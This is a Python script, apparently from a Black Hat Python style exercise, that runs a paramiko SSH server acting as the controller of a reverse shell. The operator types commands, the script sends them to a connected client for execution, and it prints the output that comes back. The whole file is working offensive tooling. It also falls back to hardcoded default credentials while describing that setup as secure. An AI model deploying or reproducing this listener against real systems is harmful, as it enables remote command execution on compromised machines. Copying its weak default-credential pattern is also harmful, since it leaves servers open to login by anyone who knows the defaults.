import os
import paramiko
import socket
import sys
import threading

# Get the current working directory
CWD = os.path.dirname(os.path.realpath(__file__))

# Load SSH private key for server authentication
HOSTKEY = paramiko.RSAKey.from_private_key_file(os.path.join(CWD, 'test_rsa.key'))

# Set SSH username and password (Replace with your own credentials)
VALID_USERNAME = os.getenv("SSH_USER", "default_user")  # Set via environment variable or use "default_user"
VALID_PASSWORD = os.getenv("SSH_PASS", "default_pass")  # Set via environment variable or use "default_pass"

class Server(paramiko.ServerInterface):
    """
    SSH Server Interface:
    - Handles authentication
    - Manages session/channel requests
    """

    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        """
        Allows opening of a 'session' type channel.
        """
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        """
        Handles authentication for SSH users.
        - Uses environment variables for credentials (recommended for security).
        """
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

if __name__ == '__main__':
    # Define server details
    SERVER_IP = '192.168.1.207'  # Server's IP address
    SSH_PORT = 2222              # Port for SSH connections

    try:
        # Create and bind a socket to listen for SSH connections
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((SERVER_IP, SSH_PORT))
        sock.listen(100)
        print(f'[+] Listening for SSH connections on {SERVER_IP}:{SSH_PORT} ...')

        # Accept incoming connection
        client, addr = sock.accept()
    except Exception as e:
        print(f'[-] Listen failed: {str(e)}')
        sys.exit(1)
    else:
        print(f'[+] Got a connection from {addr[0]}:{addr[1]}')

    # Initialize the SSH Transport Layer
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)

    # Start SSH server
    server = Server()
    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException as e:
        print(f'[-] SSH session failed: {str(e)}')
        sys.exit(1)

    # Accept an SSH channel
    chan = bhSession.accept(20)
    if chan is None:
        print('*** No channel established.')
        sys.exit(1)

    print('[+] Authenticated!')
    chan.send(b'Welcome to bh_ssh')

    # Receive client response
    print(chan.recv(1024).decode())

    try:
        while True:
            # Get user input for command execution
            command = input("Enter the command: ")
            
            if command.lower() != 'exit':
                chan.send(command.encode())  # Send command to the client
                response = chan.recv(8192)  # Receive execution result
                print(response.decode())  # Print response from the client
            else:
                chan.send(b'exit')  # Inform client about exit
                print('Exiting SSH session...')
                bhSession.close()
                break
    except KeyboardInterrupt:
        print("\n[!] Server interrupted. Closing session...")
        bhSession.close()

"""
# How to Set Environment Variables Before Running the SSH Server:

# For Linux/macOS (Run in terminal before executing the script):
export SSH_USER="your_username"
export SSH_PASS="your_password"
python ssh_server.py

# For Windows (PowerShell - Run these before executing the script):
$env:SSH_USER="your_username"
$env:SSH_PASS="your_password"
python ssh_server.py

# This ensures that the username and password are not stored in the script,
# making it more secure and flexible for different users.
"""
